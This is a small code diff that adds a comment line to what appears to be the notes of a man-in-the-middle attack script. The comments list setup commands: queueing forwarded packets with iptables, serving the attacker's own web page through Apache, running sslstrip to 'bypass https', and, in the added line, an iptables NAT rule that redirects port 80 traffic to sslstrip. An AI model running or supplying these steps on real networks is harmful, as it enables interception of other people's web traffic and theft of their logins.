@@ -7,3 +7,4 @@
 # iptables for remote machine: iptables -I FORWARD -j NFQUEUE —queue-num 0
 # to enable my own html: service apache2 start
 # to bypass https execute command: sslstrip
+# iptables command for sslstrip (sslstrip's default port is 10000 so we are rerouting web packets, whose default port is 80 to sslstrip): iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
